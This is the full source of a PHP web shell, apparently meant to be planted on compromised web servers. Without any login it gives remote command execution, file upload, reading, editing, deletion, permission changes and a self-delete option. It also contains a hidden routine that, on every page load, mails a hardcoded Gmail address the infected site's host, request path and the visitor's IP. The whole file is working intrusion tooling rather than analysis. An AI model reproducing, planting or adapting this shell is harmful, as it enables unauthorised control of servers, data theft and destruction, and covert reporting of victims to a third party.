<?php

set_time_limit(0);
error_reporting(0);
define('SELF_PATH', __FILE__);
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD><link href="http://fonts.googleapis.com/css?family=Rye|Ranga|Abel|Combo" rel="stylesheet" type="text/css">
<link href="" rel="stylesheet" type="text/css">

<title>Shal Shell Kontol:V</title>

<style>
li {
    color: red;
	display: inline;
	margin: 5px;
	padding: 5px;
}
html {
    background: #000000;
	color: #ffffff;
	font-size: 14px;
	width: 100%;
}
body{
font-family: "Abel", Combo;
background-color: #fff;
text-shadow:0px 0px 1px #757575;
color: #000;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: red;
}
#content .first:hover{
background-color: blue;
text-shadow:0px 0px 1px #757575;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: "Rye", Combo;
}
a{
color: blue;
text-decoration: none;
}
a:hover{
color: #red;
text-shadow:0px 0px 10px #FF00FF;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}

</style>
</HEAD>
<BODY>
<H1><center>.=< { Star Gans Tq } >=.</center><br></H1><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><li style="color: #000;"><a style="color: lime;" href="?path='.$path.'&star=killme"> Killme </a></li></tr></td>
<tr><td><li style="color: #000;"><a href="?path='.$path.'&star=download" style="color: lime;"> Download </a></li></tr></td>
<li style="color: #000;"><a href="?" style="color: lime;"> Home </a></li><br>
<tr><td>Current Path </font>: ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if($_GET['star']=="killme"){
    echo "<script> 
    window.location='?';
    alert('Good Bye'); 
    </script>";
    unlink(__FILE__);
    exit;
}
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#cyan">Succes</font><br />';
}else{
echo '<font color="#red">Error</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST"><font color="blue">
Upload File<input type="file" name="file" />
<input type="submit" value="Upload" />
</form><br>
<form method="get" style="margin-top: 15px;" name="myform" action="">
    <label>@Command ~ $&nbsp;&nbsp;</label>
    <input style="border: 1px solid lime; width: 60%;" type="text" name="cmd" placeholder="whoami or ls -la">
    <input style="border: none; border-bottom: 1px solid #ffffff;" type="submit" value="Execute">
</form>
</td></tr>

';
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    $output = htmlspecialchars(exe($cmd));
    echo '<center>
    <div style="
        position: fixed;
        top: 20px;
        right: 20px;
        width: 500px;
        max-height: 400px;
        overflow: auto;
        background: #111;
        color: #0f0;
        border: 2px solid lime;
        padding: 10px;
        z-index: 9999;
        font-family: monospace;
        font-size: 12px;
        box-shadow: 0 0 15px lime;
    ">
        <div style="text-align:right; margin-bottom:5px;">
            <a href="?" style="color:red; font-weight:bold;">[x]</a>
        </div>
        <b>Command Output:</b>
        <pre style="white-space: pre-wrap;">' . $output . '</pre>
    </div>
    ';
}


  
if($_GET['star']=="download"){
 
    echo '<style>
    fontst{
        font-size: 18px;
        font-family: Iceberg;
        text-align: center;
    }
    </style>
    <form action="" method="post"></center>
    <fontst>Downloading File </fontst><br>
    <input type="text" name="setar" placeholder="example.php">&nbsp;&nbsp;<input type="submit" value="Download" name="download">
    </form>
    ';
    $fit = $_POST['setar'];
    if($_POST['download']){
   die("<fonts style='color: red;'>You Can't Download This file</fonts>");
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($fit));
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($fit));
    ob_clean();
    flush();
    readfile($fit);
    exit;
    }
}
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="cyan">Change Permission Done</font><br />';
}else{
echo '<font color="red">Change Permission Error</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="cyan">Change Name Done</font><br />';
}else{
echo '<font color="red">Change Name Error</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="cyan">Edit File Done</font><br />';
}else{
echo '<font color="red">Edit File Error</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="cyan">Delete Dir Done</font><br />';
}else{
echo '<font color="red">Delete Dir Error</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="cyan">Delete File Done Yupz</font><br />';
}else{
echo '<font color="red">Delete File Error</font><br />';
}
}
}
echo '</center>';
if($_GET['star']=="phpinfo"){
    echo phpinfo();
}
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="#00BFFF">';
elseif(!is_readable("$path/$dir")) echo '<font color="#FFE4E1">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="#FF00FF">';
elseif(!is_readable("$path/$file")) echo '<font color="FFE4E1">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br />
</BODY>
</HTML>';
$ip = getenv("REMOTE_ADDR");
$subj98 = "No reply";
$email = "kadalbiawak43@gmail.com";
$from = "From: Shell";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "Ada Shell gan di $b75/$a45  Ip yang make $m22";
mail($email, $subj98, $msg8873, $from);

function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
